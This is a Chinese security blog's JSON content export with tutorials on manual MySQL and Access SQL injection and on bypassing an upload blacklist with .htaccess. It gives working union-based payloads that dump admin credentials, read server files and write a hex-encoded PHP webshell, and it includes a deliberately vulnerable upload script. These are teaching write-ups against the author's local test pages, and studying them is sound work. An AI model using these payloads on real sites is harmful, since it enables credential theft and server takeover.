在[mysqld]内加入secure_file_priv =● Linux下，修改my.cnf 在[mysqld]内加入secure_file_priv =","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"MySQL注入","slug":"MySQL注入","date":"2020-01-13T09:31:17.000Z","updated":"2020-01-13T10:33:43.357Z","comments":true,"path":"2020/01/13/MySQL注入/","link":"","permalink":"http://yoursite.com/2020/01/13/MySQL%E6%B3%A8%E5%85%A5/","excerpt":"MySQL的一些特性MySQL的注入比Access好玩得多，这是基于MySQL的特性而定的。看一下MySQL的一些特性：●MySQL通常搭配PHP使用，所以PHP的网站一般都是使用MySQL数据库；●MySQL的数据库文件通常存储在数据库安装路径下，后缀格式是myi，myd，frm；●MySQL有管理员用户名和密码，超级用户是root；●MySQL 5.0以上版本有information_schema数据库，存储着所有数据库下的表名和列名信息。MySQL可以使用和Access一样的猜解方法，但我们通常不会这样做，因为MySQL可以暴力破解数据库的很多信息。 判断注入点判断注入点需要具体情况具体分析，这里不做介绍。在这里使用我自己写的一个页面来演示。注入点是：http://localhost/test/injection.php?id=1 判断当前数据表列数使用order by语句来判断当前数据表的列数，语句如下： order by N N是1，2，3…N，直到页面返回出错，那前面一个数字就是当前数据表的列数。判断当前数据表的列数：当前数据表的列数是7。我们也可以使用union语句来判断当前数据表的列数，语句如下： and 1=2 union select 1,2,3… 一直增加数字，返回的页面都是出错的，直到返回的页面看到一些数字为止：我们可以看到2，5，6这三个奇怪的数字，这三个数字接下来很有用处。","text":"MySQL的一些特性MySQL的注入比Access好玩得多，这是基于MySQL的特性而定的。看一下MySQL的一些特性：●MySQL通常搭配PHP使用，所以PHP的网站一般都是使用MySQL数据库；●MySQL的数据库文件通常存储在数据库安装路径下，后缀格式是myi，myd，frm；●MySQL有管理员用户名和密码，超级用户是root；●MySQL 5.0以上版本有information_schema数据库，存储着所有数据库下的表名和列名信息。MySQL可以使用和Access一样的猜解方法，但我们通常不会这样做，因为MySQL可以暴力破解数据库的很多信息。 判断注入点判断注入点需要具体情况具体分析，这里不做介绍。在这里使用我自己写的一个页面来演示。注入点是：http://localhost/test/injection.php?id=1 判断当前数据表列数使用order by语句来判断当前数据表的列数，语句如下： order by N N是1，2，3…N，直到页面返回出错，那前面一个数字就是当前数据表的列数。判断当前数据表的列数：当前数据表的列数是7。我们也可以使用union语句来判断当前数据表的列数，语句如下： and 1=2 union select 1,2,3… 一直增加数字，返回的页面都是出错的，直到返回的页面看到一些数字为止：我们可以看到2，5，6这三个奇怪的数字，这三个数字接下来很有用处。 爆出MySQL的信息可以使用以下几个函数来爆出MySQL的一些信息： database() //爆出当前数据库名 version() //爆出数据库版本 user() //爆出当前用户 @@version_compile_os //爆出操作系统 使用的方法是将这些函数替换上面爆出来的一些数字，如下：我们可以看到，当前数据库名是bookinfo，用户是root，这是超级用户，操作系统是Windows。 爆出当前数据库的所有表爆出表和字段会用到information_schema这个数据库，语句如下： and 1=2 union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=当前数据库名(编码) 这里使用了group_concat这个函数，表示返回所有的表；information_schema.tables记录了所有数据库下所有表的信息。需要注意的是table_schema代表数据库名，需要进行十六进制编码。爆出bookinfo这个数据库的所有表：可以看到显示出了4个表，分别是admin，lend，user和yx_books。 爆出列名信息我们可以爆出某个数据库的的所有列名信息，语句如下： and 1=2 union select 1, group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name=表名（编码） information_shcema.columns记录了所有列名的信息，我们只需要指定表名就可以查询出具体某个表的列名信息，注意这里的表名需要进行十六进制编码。爆出admin表的列名信息： 爆出数据库的内容爆出admin表的username和password这两列的内容，构造语句如下： and 1=2 union select 1,group_concat(username),3,4,group_concat(password),6,7 from admin 不使用group_concat()函数只能查询出第一条记录。查询结果如下： 读取文件信息如果存在注入点，而且当前用户是root，MySQL的注入会变得好玩很多，比如我们可以试着读取某些文件的内容。读取文件用到load_file()函数，这个函数必须使用文件的绝对路径，所以在使用时我们必须想办法知道想要读取文件的路径。文件读取的语句如下： and 1=2 union select 1,load_file(‘文件路径’),3,4,5,6,7 我们知道服务器的操作系统是Windows，试着读取hosts文件的内容：读取成功！注意路径的分隔符用的是“\\\\”，也可以使用“/”。但是不要使用“\\”，因为“\\”在编程里面常用于转义，后面接一些字符会出现问题。 写入文件信息我们还可以直接写入一句话代码，如果目录有写入权限的话。写入文件使用的是into outfile函数。写入文件时也需要知道网站的绝对路径，否则写进去也无法成功访问。写入的语句如下： and 1=2 union select 1,写入内容的十六进制编码，3,4,5,6,7 into outfile ‘写入文件路径’ 我们在“D:\\phpstudy\\www\\test”下写入php一句话木马： 页面报错了，不过实际上写入成功了。注意我们对php一句话的内容进行了十六进制编码，这样可以绕过一些防护软件或者转义限制。hack.php的内容如下： 然后就可以直接上菜刀了： 魔术引号问题root权限虽然可以使用load_file()和into outfile对文件进行读取和写入，但我们也会遇到无法读取和写入的情况。这些情况通常是由于对目录或者文件权限不够的原因引起的，但也有可能是魔术引号问题引起的。魔术引号通常是指magic_quotes_gpc开关，当开关打开时，所有的GET、POST和COOKIE请求的数据中的单引号（’）、双引号（”）、反斜线（\\）和NULL字符都会被自动加上一个反斜线进行转义，这和addslashes()函数的作用完全相同。魔术引号其实就是为了防止SQL注入而增加的功能。不过自PHP 5.4.0起这个功能就被移除了。我们演示一下这个功能吧。在php.ini中开启魔术引号：我们读取一下hosts文件的内容： 读不出来！为了方便，我把sql语句显示了出来。可以看到，前面加上了一个反斜线，导致路径出错了。解决魔术引号问题的办法就是编码，将路径进行编码，注意编码的路径是不带单引号的： 顺利读取出来了。所以在进行读取和写入时，最好都进行编码。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"Access注入","slug":"Access注入","date":"2020-01-13T08:58:44.000Z","updated":"2020-01-13T09:26:53.757Z","comments":true,"path":"2020/01/13/Access注入/","link":"","permalink":"http://yoursite.com/2020/01/13/Access%E6%B3%A8%E5%85%A5/","excerpt":"Access的一些特性Access的一些特性如下：●Aceess通常搭配ASP网站；●Access的数据库文件存放在网站目录下（通常是database或者db目录），后缀格式通常是mdb（也可能是asp或者asa）。我们可以想办法下载数据库文件。●Access数据库没有用户名和密码，也没有数据库名。 Access手工注入Access注入的步骤通常如下：（1）.判断注入点（2）.猜解表名（3）.猜解列名（4）.猜解内容 判断注入点判断注入点有很多种方法，要根据具体情况使用，所以这里也不详细解释。 猜解表名Access的表名和列名都只能靠猜。表名的猜解使用exists函数，猜解语句如下： and exists(select * from 表名) 如果返回正常，说明数据库中有这个表。猜解是否有user表：显示出错，说明没有user表。猜解是否有admin表：很明显，有admin这个表。","text":"Access的一些特性Access的一些特性如下：●Aceess通常搭配ASP网站；●Access的数据库文件存放在网站目录下（通常是database或者db目录），后缀格式通常是mdb（也可能是asp或者asa）。我们可以想办法下载数据库文件。●Access数据库没有用户名和密码，也没有数据库名。 Access手工注入Access注入的步骤通常如下：（1）.判断注入点（2）.猜解表名（3）.猜解列名（4）.猜解内容 判断注入点判断注入点有很多种方法，要根据具体情况使用，所以这里也不详细解释。 猜解表名Access的表名和列名都只能靠猜。表名的猜解使用exists函数，猜解语句如下： and exists(select * from 表名) 如果返回正常，说明数据库中有这个表。猜解是否有user表：显示出错，说明没有user表。猜解是否有admin表：很明显，有admin这个表。 猜解列名列名的猜解和表名一样，也是用exists函数。语句如下： and exists(select 列名 from 表名) 返回正常，则说明有这个列。。猜解是否有admin列：猜解是否有password列： 猜解列的长度猜解列的长度需要用到len函数，语句如下： and (select top 1 len(列名) from 表名)>num num是数字，可以是1，2，3……直到页面返回出错为止，则该值就是列的长度。这个语句只能猜解第一条记录的长度。 猜解admin列第一条记录的长度：admin列第一条记录的长度是5。 猜解列的内容猜解列的内容用到两个函数mid和asc，mid(列名, N, 1)函数发截取第N位字符，asc(mid(列名, N, 1))函数取得第N位字符ascii码，ascii码对应的字符就是我们猜解出来的内容。语句如下： and select top 1 asc(mid(列名, N, 1) from 表名)>num num是ascii码，直到页面返回出错，则该值就是对应位置字符的ascii码。猜解admin列第一条记录的第一个字符：由上面可知，admin列第一个值第一个字符对应的ascii码是97，则该字符为“a”，接下来的字符猜解方法是一样的。 union查询上面的方法在猜解列的内容时是十分麻烦的，我们可以使用union使猜解变得简单起来。union是针对两个表的联合查询，使用union时两个表的列数和数据类型必须完全一致才能进行查询。下面用实例说话，我们猜解当前表的列数，使用order by语句： order by num num是列的数量，直到页面返回不正常，那上一个正常的返回值就是列数。返回错误，由此可知当前表的列数是5。使用union也可以猜解当前表的列数，语句是： and 1=2 union select 1,2,3…N from 表名 使用and 1=2使第一条查询语句出错，union执行第二条查询语句，n是列数，由1，2，3一直往上加，直到页面出现数字为止。这里需要注意的是，后面的表名不是当前表的表名，而是你需要猜解的表名，而猜解出来的列数却是当前表的列数。从图中我们可以看到2和3这两个数字，这表示它显示的是当前表的第2列和第3列的查询结果。我们利用上面得到的数字来进行暴表，语句如下： And 1=2 union select 1,列1,列2,3,4,5 from 表名 看图，我们成功地将admin和password这两列的第一条记录暴出来了，是不是比上面使用的方法简单多了。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":".htaccess绕过黑名单上传","slug":"htaccess绕过黑名单上传","date":"2020-01-11T10:35:58.000Z","updated":"2020-01-14T02:57:12.594Z","comments":true,"path":"2020/01/11/htaccess绕过黑名单上传/","link":"","permalink":"http://yoursite.com/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/","excerpt":".htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。[1]在文件上传使用扩展名黑名单且没有过滤.htaccess的情况下，可以使用.htaccess文件绕过上传限制。测试上传功能的代码如下： &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; &lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;&gt; &lt;/form&gt; &lt;?php $black_list = array(&#39;html&#39;, &#39;htm&#39;, &#39;php&#39;, &#39;php2&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;txt&#39;); if(isset($_FILES[&#39;file&#39;])) { $file_name = $_FILES[&#39;file&#39;][&#39;name&#39;]; $file_path = &#39;images/&#39; . $file_name; $file_ext = substr($file_name, strrpos($file_name, &#39;.&#39;)+1); $file_tmp = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]; foreach($black_list as $key=&gt;$value) { if($value == strtolower($file_ext)) { echo &quot;不允许上传的文件类型！&quot;; exit(0); } } if(!move_uploaded_file($file_tmp, $file_path)) { echo &quot;文件上传失败！&quot;; } else { echo &quot;文件上传成功，文件路径为&quot; . $file_path; } } ?&gt; 新建.htaccess文件内容如下： &lt;FilesMatch &quot;lala&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 上传该文件，由于文件扩展名不在黑名单中，所以可以上传成功：接着上传一个文件名包含“lala”且没有扩展名一句话木马文件：两个文件都能上传成功，使用菜刀连接lala文件：所以在使用黑名单过滤且未包含htaccess扩展名的情况下，.htaccess通常是个大杀器。 参考：[1]百度百科：https://baike.baidu.com/item/htaccess/1645473","text":".htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。[1]在文件上传使用扩展名黑名单且没有过滤.htaccess的情况下，可以使用.htaccess文件绕过上传限制。测试上传功能的代码如下： &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; &lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;&gt; &lt;/form&gt; &lt;?php $black_list = array(&#39;html&#39;, &#39;htm&#39;, &#39;php&#39;, &#39;php2&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;txt&#39;); if(isset($_FILES[&#39;file&#39;])) { $file_name = $_FILES[&#39;file&#39;][&#39;name&#39;]; $file_path = &#39;images/&#39; . $file_name; $file_ext = substr($file_name, strrpos($file_name, &#39;.&#39;)+1); $file_tmp = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]; foreach($black_list as $key=&gt;$value) { if($value == strtolower($file_ext)) { echo &quot;不允许上传的文件类型！&quot;; exit(0); } } if(!move_uploaded_file($file_tmp, $file_path)) { echo &quot;文件上传失败！&quot;; } else { echo &quot;文件上传成功，文件路径为&quot; . $file_path; } } ?&gt; 新建.htaccess文件内容如下： &lt;FilesMatch &quot;lala&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 上传该文件，由于文件扩展名不在黑名单中，所以可以上传成功：接着上传一个文件名包含“lala”且没有扩展名一句话木马文件：两个文件都能上传成功，使用菜刀连接lala文件：所以在使用黑名单过滤且未包含htaccess扩展名的情况下，.htaccess通常是个大杀器。 参考：[1]百度百科：https://baike.baidu.com/item/htaccess/1645473","categories":[{"name":"文件上传","slug":"文件上传","permalink":"http://yoursite.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-01-11T07:54:24.958Z","updated":"2020-01-10T07:21:15.000Z","comments":true,"path":"2020/01/11/hello-world/","link":"","permalink":"http://yoursite.com/2020/01/11/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new &quot;My New Post&quot; More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new &quot;My New Post&quot; More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}